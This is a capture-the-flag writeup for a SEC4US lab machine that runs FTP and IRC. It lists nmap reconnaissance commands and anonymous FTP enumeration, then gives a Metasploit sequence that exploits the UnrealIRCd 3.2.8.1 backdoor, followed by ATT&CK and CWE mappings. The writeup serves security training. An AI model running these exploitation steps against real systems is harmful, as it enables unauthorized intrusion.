# Maq141: FTP e IRC Server

Writeup for the **FTP e IRC Server** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 141

---

## Overview

A machine running both FTP and IRC services, each with exploitable vulnerabilities. The challenge requires chaining information from one service to exploit the other.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Expect to find port 21 (FTP) and port 6667 (IRC). Identify service versions carefully.

**FTP enumeration:**

```bash
ftp [TARGET_IP]
# Check anonymous access
nmap --script ftp-anon -p 21 [TARGET_IP]
```

**IRC enumeration:**

```bash
nmap -sV -p 6667 --script irc-info [TARGET_IP]
```

## Exploitation

**Path 1: FTP first.** If anonymous access is available, download files that may contain IRC credentials or configuration hints:

```bash
ftp [TARGET_IP]
ftp> ls -la
ftp> get [INTERESTING_FILE]
```

**Path 2: IRC backdoor.** If UnrealIRCd 3.2.8.1 is running:

```bash
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS [TARGET_IP]
run
```

**Path 3: Chain both.** Credentials found on FTP may grant access to a restricted IRC channel, or vice versa. Check FTP config files after gaining a shell through IRC.

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Network Service Discovery | T1046 |
| Unsecured Credentials: Credentials in Files | T1552.001 |

### CWE

- **CWE-912:** Hidden Functionality
- **CWE-287:** Improper Authentication

---

Two vulnerable services on one box double the attack surface and halve the time to compromise. Defense is only as strong as the weakest listener on any port.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
